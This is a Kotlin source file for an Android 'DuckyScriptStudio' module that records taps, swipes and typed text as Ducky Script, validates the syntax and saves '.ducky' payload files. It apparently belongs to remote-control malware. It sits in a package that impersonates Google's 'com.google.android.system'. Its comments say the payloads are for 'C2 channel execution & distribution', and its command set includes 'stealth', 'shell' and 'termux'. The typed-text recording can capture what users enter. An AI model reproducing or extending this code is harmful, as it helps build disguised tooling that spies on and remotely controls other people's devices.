package com.google.android.system

import android.content.Context
import android.os.SystemClock
import android.util.Log
import java.io.File
import java.util.Locale
import java.util.concurrent.CopyOnWriteArrayList

/**
 * DuckyScriptStudio
 *
 * Visual Touch Macro Recorder & Ducky Script 1.0/2.0 Syntax Validation Studio (FEAT-08):
 * - Visually records remote & local UI touch gestures (taps, swipes, text entries).
 * - Converts touch events into normalized Ducky Script statements (TAP relX relY, SWIPE sx sy ex ey dur, STRING text).
 * - Validates Ducky Script payload syntax prior to execution.
 * - Exports validated .ducky files for C2 channel execution & distribution (#29-ducky-script-payloads).
 */
object DuckyScriptStudio {

    private const val TAG = "DuckyScriptStudio"

    @Volatile
    var isRecordingMacro: Boolean = false
        private set

    private val recordedLines = CopyOnWriteArrayList<String>()
    private var lastRecordedEventTime: Long = 0L

    data class SyntaxValidationReport(
        val isValid: Boolean,
        val totalLines: Int,
        val validCommandsCount: Int,
        val errorLines: List<String>
    )

    /**
     * Starts recording a visual touch macro.
     */
    @Synchronized
    fun startMacroRecording() {
        recordedLines.clear()
        recordedLines.add("REM --------------------------------------------------")
        recordedLines.add("REM Ducky Script Macro Recorded via DuckyScriptStudio")
        recordedLines.add("REM Target Device: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
        recordedLines.add("REM --------------------------------------------------")
        recordedLines.add("DEFAULT_DELAY 200")
        lastRecordedEventTime = SystemClock.elapsedRealtime()
        isRecordingMacro = true
        Log.i(TAG, "Ducky Script Macro Recording STARTED.")
    }

    /**
     * Stops macro recording and exports generated script to File.
     */
    @Synchronized
    fun stopMacroRecording(context: Context, fileNameArg: String = ""): File? {
        if (!isRecordingMacro) return null
        isRecordingMacro = false

        val fileName = if (fileNameArg.isNotBlank()) {
            if (fileNameArg.endsWith(".ducky") || fileNameArg.endsWith(".txt")) fileNameArg else "$fileNameArg.ducky"
        } else {
            "macro_${System.currentTimeMillis()}.ducky"
        }

        return try {
            val payloadDir = File(context.filesDir, "ducky_payloads").apply {
                if (!exists()) mkdirs()
            }
            val outputFile = File(payloadDir, fileName)
            val scriptContent = recordedLines.joinToString("\n")
            outputFile.writeText(scriptContent)

            Log.i(TAG, "Ducky Script Macro Recording STOPPED. Exported ${recordedLines.size} lines to: ${outputFile.absolutePath}")
            outputFile
        } catch (e: Exception) {
            Log.e(TAG, "Error exporting macro script: ${e.message}", e)
            null
        }
    }

    /**
     * Records a tap event (relX, relY normalized 0.0..1.0).
     */
    fun recordTapEvent(relX: Float, relY: Float) {
        if (!isRecordingMacro) return
        appendDelayIfNeeded()
        val line = "TAP ${"%.3f".format(Locale.US, relX)} ${"%.3f".format(Locale.US, relY)}"
        recordedLines.add(line)
        Log.d(TAG, "Recorded macro line: $line")
    }

    /**
     * Records a swipe gesture (relSx, relSy, relEx, relEy normalized).
     */
    fun recordSwipeEvent(relSx: Float, relSy: Float, relEx: Float, relEy: Float, durationMs: Long = 300L) {
        if (!isRecordingMacro) return
        appendDelayIfNeeded()
        val line = "SWIPE ${"%.3f".format(Locale.US, relSx)} ${"%.3f".format(Locale.US, relSy)} ${"%.3f".format(Locale.US, relEx)} ${"%.3f".format(Locale.US, relEy)} $durationMs"
        recordedLines.add(line)
        Log.d(TAG, "Recorded macro line: $line")
    }

    /**
     * Records a typed text string.
     */
    fun recordTextEvent(text: String) {
        if (!isRecordingMacro || text.isBlank()) return
        appendDelayIfNeeded()
        val line = "STRING $text"
        recordedLines.add(line)
        Log.d(TAG, "Recorded macro line: $line")
    }

    private fun appendDelayIfNeeded() {
        val now = SystemClock.elapsedRealtime()
        val deltaMs = now - lastRecordedEventTime
        lastRecordedEventTime = now

        if (deltaMs in 250..10000) {
            recordedLines.add("DELAY $deltaMs")
        }
    }

    /**
     * Validates Ducky Script 1.0/2.0 syntax.
     */
    fun validateScriptSyntax(scriptContent: String): SyntaxValidationReport {
        val lines = scriptContent.lines()
        val errorLines = mutableListOf<String>()
        var validCount = 0

        val validCommands = setOf(
            "rem", "default_delay", "defaultdelay", "delay", "string", "stringln",
            "enter", "tab", "delete", "backspace", "escape", "esc", "home",
            "gui", "windows", "command", "recents", "recent", "app_switch",
            "notification", "notifications", "quick_settings", "quicksettings",
            "power", "power_dialog", "lock", "volup", "volume_up", "voldown", "volume_down",
            "tap", "click", "swipe", "unlock", "stealth", "shell", "termux",
            "app_open", "open_app", "launch"
        )

        for ((index, rawLine) in lines.withIndex()) {
            val line = rawLine.trim()
            if (line.isEmpty()) continue

            val lower = line.lowercase(Locale.ROOT)
            val firstToken = lower.substringBefore(" ").trim()

            if (validCommands.contains(firstToken) || lower.startsWith("gui ") || lower.startsWith("windows ")) {
                validCount++
            } else {
                errorLines.add("Line ${index + 1}: Unrecognized syntax '$line'")
            }
        }

        return SyntaxValidationReport(
            isValid = errorLines.isEmpty(),
            totalLines = lines.size,
            validCommandsCount = validCount,
            errorLines = errorLines
        )
    }

    fun getRecordedLinesCount(): Int = recordedLines.size
}
